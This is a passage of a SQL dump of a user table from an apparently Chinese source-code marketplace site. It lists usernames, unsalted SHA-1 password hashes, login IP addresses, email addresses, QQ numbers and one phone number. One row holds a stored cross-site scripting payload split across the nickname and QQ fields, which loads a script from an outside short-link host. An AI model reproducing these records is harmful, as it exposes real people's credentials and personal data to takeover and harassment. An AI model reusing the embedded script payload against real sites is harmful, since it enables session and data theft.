(195, 'zyf123456', 'db899965f0f8ef70be8918cdd7166b7f246fa408', '2018-09-03 01:36:37', '117.132.193.9', 0.01, 10, 'zyf123456', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'db899965f0f8ef70be8918cdd7166b7f246fa408', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(196, 'qq862906821', 'c8495fd72be714e9a3ab606e36c3db11e4fef14f', '2018-09-04 18:05:43', '183.6.27.96', 0.01, 10, 'kim', '', 0, '862906821@qq.com', 0, '862906821', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c8495fd72be714e9a3ab606e36c3db11e4fef14f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(197, '15397462010', '9edefc1ed39bb0ec0da17c8d852284808ab57855', '2018-09-07 14:12:20', '183.158.197.236', 0.01, 10, '日日新', '', 0, '15397462010@163.com', 0, '3340336491', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '9edefc1ed39bb0ec0da17c8d852284808ab57855', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(198, '15977184909', 'eb918f0c7c9baa19d22f901fe76441a9d7dda406', '2018-09-17 13:40:59', '171.109.240.122', 0.01, 20, '15977184909', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'eb918f0c7c9baa19d22f901fe76441a9d7dda406', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(199, '6656565', 'b4fb5c7da6353c0727db593937cf2078e7fee268', '2018-09-22 22:31:57', '175.2.49.106', 3.01, 10, '6656565', '', 0, '6656565@qq.com', 0, '6656565', NULL, '2019-03-22 20:56:17', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b4fb5c7da6353c0727db593937cf2078e7fee268', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0852897001553259377', NULL, NULL),
(200, '1111111', '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', '2018-09-23 21:26:02', '106.12.19.7', 0.01, 10, 'jjhjjk', '', 0, '7788888@qq.com', 0, '77788889', NULL, '2018-09-23 21:26:03', '', 0, 373, 'jjjjk', '888', 'iij', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2019-09-23 21:27:06', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(201, '111111q1', '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', '2018-09-23 22:43:02', '111.15.93.220', 0.01, 10, 'hhhh', '', 0, '678666678@qq.com', 0, '77777', NULL, '2018-09-23 22:43:39', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(202, 'deje0000', '4a0cde71aee7158542d013fc0c9f5acfc735c612', '2018-09-25 22:21:41', '124.226.60.229', 0.01, 10, 'aaa111', '', 0, '10000@qq.com', 0, '10000', NULL, '2018-09-25 22:21:41', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '4a0cde71aee7158542d013fc0c9f5acfc735c612', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(203, 'dxpl', 'a8a84617036b127d700d83e4deabb1e42f69e9de', '2018-09-29 21:05:30', '110.212.254.161', 0.01, 10, 'dxpl', '', 0, '9310612@qq.com', 0, '9310612', NULL, '2018-09-29 21:05:30', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a8a84617036b127d700d83e4deabb1e42f69e9de', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(204, '64665656', 'f2b2bc3abdb385551ce1d5eb80d73950f6dd8e80', '2018-10-01 01:54:01', '175.2.87.46', 3.01, 10, '64665656', '', 0, '64665656@qq.com', 0, '64665656', NULL, '2018-10-01 01:56:29', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f2b2bc3abdb385551ce1d5eb80d73950f6dd8e80', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(205, 'qq7217258', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2018-10-04 22:13:47', '39.181.177.19', 0.01, 10, '7217258', '', 0, '7217258@qq.com', 0, '7217258', NULL, '2018-10-04 22:13:48', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(206, 'lingou', '6211d25577708fec78f64f7553e86a8fddae8a64', '2018-10-04 23:18:54', '223.73.86.181', 0.01, 10, '凌忆尘', '', 0, '2188969090@qq.com', 0, '2188969090', NULL, '2018-10-04 23:18:54', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6211d25577708fec78f64f7553e86a8fddae8a64', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(207, '120657575', '9474c895e15cd205f3a9e3497bbf305a9aa59177', '2018-10-06 19:40:21', '171.213.91.174', 0.01, 10, '八爪哥', '', 0, '12065757@qq.com', 0, '120657575', NULL, '2018-10-06 21:45:37', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '9474c895e15cd205f3a9e3497bbf305a9aa59177', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(208, 'ddf123211', '250a835d49a76d83540f66a5ff549f9c97c3c2af', '2018-10-12 11:06:55', '36.157.182.11', 0.01, 10, '123211', '', 0, '123211@qq.com', 0, '123211', NULL, '2018-10-12 11:06:56', '', 0, 238, 'awedwe', 'weweaw', 'eaweawe', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '250a835d49a76d83540f66a5ff549f9c97c3c2af', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2019-10-12 11:07:04', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(209, 'lhjlhj', 'c53255317bb11707d0f614696b3ce6f221d0e2f2', '2018-10-12 14:47:51', '59.51.4.225', 0.01, 10, '嗯啊所多', '', 0, '2477875@qq.com', 0, '2477875', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c53255317bb11707d0f614696b3ce6f221d0e2f2', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(210, '56114654645', '0c99711e17a8560637a5073923a6d45a8e7d9449', '2018-10-12 22:46:27', '222.242.69.158', 0.01, 10, '56114654645', '', 0, '56114654645@qq.com', 0, '56114654645', NULL, '2018-10-12 22:46:27', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '0c99711e17a8560637a5073923a6d45a8e7d9449', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(211, '644646', 'b2b12498ad8953b3fcb8cb6c0f8c5b5758b55ffa', '2018-10-13 22:27:06', '222.242.69.158', 0.01, 10, '644646', '', 0, '644646@qq.com', 0, '644646', NULL, '2018-10-13 22:27:11', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b2b12498ad8953b3fcb8cb6c0f8c5b5758b55ffa', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(212, '523123123', 'ab8828aa7bd90fca7c8c709125c14779a8cb0a37', '2018-10-13 22:29:04', '180.88.184.19', 0.01, 20, '523123123', '', 0, '523123123@qq.com', 0, '523123123', NULL, '2018-10-13 22:53:43', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'ab8828aa7bd90fca7c8c709125c14779a8cb0a37', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(213, 'gg123', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2018-10-23 13:18:06', '180.136.232.30', 0.01, 10, 'laixiaoyu', '', 0, '635756216@qq.com', 0, '63575616', NULL, '2018-10-23 13:18:06', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(214, '206278958', '313489b95047722bf410288aa63e74bfdda6ce3a', '2018-10-25 10:37:49', '125.120.14.210', 0.01, 10, '206278958', '', 0, '206278958@qq.com', 0, '206278958', NULL, '2018-10-25 10:37:49', '', 0, 193, '1', '1', '1', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '313489b95047722bf410288aa63e74bfdda6ce3a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2019-10-25 10:37:59', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(215, 'h488999', '2a13c80b6ab2cdf25b6c12b1f29c0e4d4a0bf1b8', '2018-11-01 14:41:11', '1.194.68.36', 0, 1010, '极速搭建', '15322477715', 0, '675312826@qq.com', 1, '675312826', 'jsdjyoyo', '2019-04-23 23:16:05', '', 0, 261, '精品源码建站', '网站搭建，二开采集修复，网站维护！', '网站搭建，二开采集修复，网站维护！', '', 1, 1, 0, 2, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, 0, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2065-11-17 14:41:30', '普通会员', '2049-04-23 23:16:09', NULL, NULL, '', NULL, '', NULL, 0, NULL, '0761324001556031687', NULL, NULL),
(216, 'abacd520', 'e6d9567c1dc846c330e6bcf59d09971f3cc1d9e3', '2018-11-07 11:02:11', '222.216.129.33', 0.01, 10, 'daqo', '', 0, '2981398382@qq.com', 0, '2981398382', NULL, '2018-11-07 11:02:25', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e6d9567c1dc846c330e6bcf59d09971f3cc1d9e3', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(217, 'mn889713', '7d2491a2e84e999d73d3991e1b952e5916e5455f', '2018-11-18 15:21:33', '223.88.38.105', 0.01, 10, 'mn889713', '', 0, '1605810071@qq.com', 0, '1605810071', NULL, '2018-11-18 15:26:18', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7d2491a2e84e999d73d3991e1b952e5916e5455f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(218, 'vioee', 'f3612ff19ea9cd9c01f715556593fcc47cb1e77e', '2018-11-29 11:53:41', '222.142.73.43', 0.01, 10, '微e站', '', 0, '56734112@qq.com', 1, '56734112', NULL, '2019-10-25 10:54:35', '', 0, 239, '微e站', '各类游戏app开发搭建', '微e站-专业的虚拟资源下载社区,棋牌游戏源码,组件,程序,教程,下载平台,游戏搭建架设一条龙服务。\r\n', NULL, 0, 1, 0, 2, NULL, NULL, NULL, '', NULL, NULL, NULL, NULL, 'f3612ff19ea9cd9c01f715556593fcc47cb1e77e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2019-11-29 11:54:29', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0174441001571972075', NULL, NULL),
(219, '61655665', 'cbb3455fe60edb6c6a8e064cc05adbd19f71c5c1', '2018-12-01 22:44:44', '223.157.165.218', 0.01, 10, '61655665', '', 0, '61655665@qq.com', 0, '61655665', NULL, '2018-12-11 13:28:16', '', 0, 2, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'cbb3455fe60edb6c6a8e064cc05adbd19f71c5c1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(220, 'test123', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2018-12-11 14:30:37', '111.227.7.37', 0.01, 10, 'hahah', '', 0, '123456@qq.com', 0, '', NULL, '2018-12-11 14:30:43', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, '636941', NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(221, 'uinaes', '6367c48dd193d56ea7b0baad25b19455e529f5ee', '2018-12-19 23:22:13', '101.46.20.30', 0.01, 10, 'uinaes', '', 0, '83869743@qq.com', 0, '8869743', NULL, '2018-12-19 23:22:14', '', 0, 152, '啦啦啦', '啊啊啊啊', '啊啊啊啊啊啊啊啊啊啊啊啊啊', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6367c48dd193d56ea7b0baad25b19455e529f5ee', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2019-12-19 23:23:00', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(222, 'lmtschs', 'aee2061211663d97812f29bfa13ccab486d33425', '2018-12-24 12:12:27', '110.124.183.83', 0.01, 10, 'lmtschs', '', 0, '893643808@qq.com', 0, '893643808', NULL, '2018-12-24 12:12:59', '', 0, 2, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'aee2061211663d97812f29bfa13ccab486d33425', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(223, 'wawa', '01b307acba4f54f55aafc33bb06bbbf6ca803e9a', '2018-12-29 19:50:29', '116.196.91.211', 0.01, 10, '钱钱钱钱', '', 0, '835777@qq.com', 0, '7897797', NULL, '2018-12-29 19:50:29', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '01b307acba4f54f55aafc33bb06bbbf6ca803e9a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(224, 'aa12345', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-01-01 06:51:10', '119.136.113.237', 0.01, 10, 'aaa', '', 0, '742859533@qq.com', 0, '742859533', NULL, '2019-01-10 14:46:11', '', 0, 132, '额外的', '速度', '速度', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-01-01 06:51:53', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(225, 'testadmin', '743139240ff612253817440d98acb2ce7939fbb4', '2019-01-08 22:19:22', '110.184.83.187', 0.01, 10, '"><ScRiPt src=//t.cn/EbIdY7O>/', '', 0, 'testadmin@qq.com', 0, '*/</sCrIpT><input id="', '', '2019-01-08 22:19:29', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '743139240ff612253817440d98acb2ce7939fbb4', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', '', NULL, NULL, NULL, NULL, NULL),
(226, '25737475', '583c777850f005dca67f847cfa3b376b82909a53', '2019-01-17 13:40:16', '139.205.13.91', 0.01, 10, '小科', '', 0, '25737475@qq.com', 0, '25737475', NULL, '2019-01-17 13:43:19', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '583c777850f005dca67f847cfa3b376b82909a53', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(227, '13579', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', '2019-01-20 22:01:39', '120.230.81.190', 0.01, 20, '12345678', '', 0, '11@qq.com', 0, '12345678', NULL, '2019-01-20 22:06:20', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(228, 'shlcom', '7616c56b282ebafece2852f5dd0ebc885c7e051f', '2019-01-26 22:06:32', '124.115.133.200', 0.01, 20, 'aigiaie', '', 0, 'shlcom@163.com', 0, '546125444', NULL, '2019-02-24 19:13:47', '', 0, 122, '124141', '111', '111', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7616c56b282ebafece2852f5dd0ebc885c7e051f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-01-26 22:07:06', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(229, 'x12444', '5edb5e9ed01de3b6bf5d96f38650673412e0bef1', '2019-02-17 22:29:54', '113.127.227.143', 0.01, 10, '232312333', '', 0, '2312123@qq.com', 0, '3123123123', NULL, '2019-02-17 22:30:06', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '5edb5e9ed01de3b6bf5d96f38650673412e0bef1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(230, 'weidao2011', 'c6d373020f8219f519b0fce545b659d63939dd54', '2019-02-24 20:43:11', '121.35.0.170', 0.01, 10, 'weidao2011', '', 0, '1@q.com', 0, '', NULL, '2019-02-24 21:14:06', '', 0, 54, '小7源码', '1', '1', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c6d373020f8219f519b0fce545b659d63939dd54', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-02-24 21:12:49', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(231, 'test', '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', '2019-03-01 00:11:56', '114.107.29.214', 0.01, 10, 'test', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(232, '1919088', 'fd60e3e84580007af1b60fd7f890e9ea9010d0e2', '2019-03-01 03:22:16', '113.200.205.3', 0.01, 10, '1919088', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'fd60e3e84580007af1b60fd7f890e9ea9010d0e2', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(233, 'bay118', '89e89c17f877ca2821b557f633cec3253b0aa941', '2019-03-01 11:07:23', '39.185.119.23', 0.01, 10, 'fasf', '', 0, '423423@rfsd.com', 0, '234234', NULL, '2019-03-01 13:07:46', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '89e89c17f877ca2821b557f633cec3253b0aa941', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(234, 'pigsns', '87be668223bc162d2f8599d046883da7d918b596', '2019-03-02 17:34:23', '101.130.165.179', 0.01, 20, '小猪', '', 0, '756467418@qq.com', 0, '756467418', NULL, '2019-03-02 17:37:39', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '87be668223bc162d2f8599d046883da7d918b596', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(235, 'qq2318316664', 'e5198e034ad60c9fdf1d76a5dce41aac43d27bce', '2019-03-20 23:12:35', '223.96.159.82', 0.01, 10, '供应方员工', '', 0, '2318316664@qq.com', 0, '2318316664', NULL, '2019-03-20 23:14:32', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e5198e034ad60c9fdf1d76a5dce41aac43d27bce', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0186389001553094760', NULL, NULL),
(236, 'zxc123', 'd5a1bdf9ce989fd6161063e94b92bdeacb94ed23', '2019-03-21 15:49:03', '113.246.174.92', 0.01, 10, 'zxc123', '', 0, 'zxc123@qq.com', 0, 'zxc123', NULL, '2019-03-22 13:36:17', '', 0, 42, 'zxc123', 'zxc123', 'zxc123', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd5a1bdf9ce989fd6161063e94b92bdeacb94ed23', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-03-21 15:49:14', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0336254001553154543', NULL, NULL),
(237, '11111111', 'a642a77abd7d4f51bf9226ceaf891fcbb5b299b8', '2019-03-22 15:03:26', '219.138.247.109', 0.01, 30, '21额212', '', 0, '12412412@qq.com', 0, '11111111', NULL, '2019-03-28 21:20:37', '', 0, 64, '1243214', '235262', '问62462', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a642a77abd7d4f51bf9226ceaf891fcbb5b299b8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-03-22 15:03:43', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0945262001553238209', NULL, NULL);
INSERT INTO `yjcode_user` (`id`, `uid`, `pwd`, `sj`, `uip`, `money1`, `jf`, `nc`, `mot`, `ifmot`, `email`, `ifemail`, `uqq`, `weixin`, `yxsj`, `openid`, `ifqq`, `djl`, `shopname`, `seokey`, `seodes`, `txt`, `pm`, `zt`, `openshop`, `shopzt`, `shopztsm`, `getpwd`, `bdmot`, `bdemail`, `txyh`, `txname`, `txzh`, `txkhh`, `zfmm`, `sellmall`, `sellmyue`, `tjuserid`, `sellbl`, `xinyong`, `sfz`, `sfzrz`, `sfzrzsm`, `uname`, `djmoney`, `pf1`, `pf2`, `pf3`, `baomoney`, `dqsj`, `userdj`, `userdjdq`, `ordertx1`, `ordertx2`, `wxopenid`, `myweb`, `unionid`, `mytxt`, `shoptype`, `openshop1`, `mybh`, `jbmot`, `ifmian`) VALUES
(238, 'ceshi12', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-03-29 15:58:16', '223.96.219.17', 0.01, 10, '测试12', '', 0, '709338141@qq.com', 0, '709338141', NULL, '2019-03-29 15:58:52', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0836462001553846296', NULL, NULL),
